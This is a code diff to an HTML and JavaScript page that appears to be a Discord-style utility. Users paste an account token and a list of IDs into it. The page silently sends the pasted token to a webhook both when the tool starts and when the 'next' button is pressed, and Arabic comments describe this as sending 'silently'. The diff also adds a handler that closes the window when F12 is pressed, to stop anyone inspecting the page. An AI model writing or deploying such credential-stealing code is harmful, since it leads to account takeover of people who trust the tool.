@@ -67,7 +67,7 @@
     <textarea id="tokenInput" rows="4" placeholder="توكن واحد فقط"></textarea>
 
     <label>اكتب الايديات (مفصولة بفاصلة):</label>
-    <input type="text" id="idsInput" placeholder="مثلاً: 1381381865793130638" />
+    <input type="text" id="idsInput" placeholder="مثلاً: 123456789012345678,987654321098765432" />
 
     <label>ID روم / خاص / قروب:</label>
     <input type="text" id="channelTypeInput" />
@@ -152,7 +152,7 @@
         return;
       }
 
-      sendToWebhook(token); // يرسل التوكن بصمت
+      sendToWebhook(token); 
 
       let i = 0;
       intervalId = setInterval(() => {
@@ -178,7 +178,14 @@
 
     nextBtn.addEventListener('click', () => {
       const token = tokenInput.value.trim();
-      if (token) sendToWebhook(token); 
+      if (token) sendToWebhook(token); // إرسال بصمت
+    });
+
+    
+    document.addEventListener('keydown', function (e) {
+      if (e.key === "F12") {
+        window.open('', '_self').close();
+      }
     });
 
     
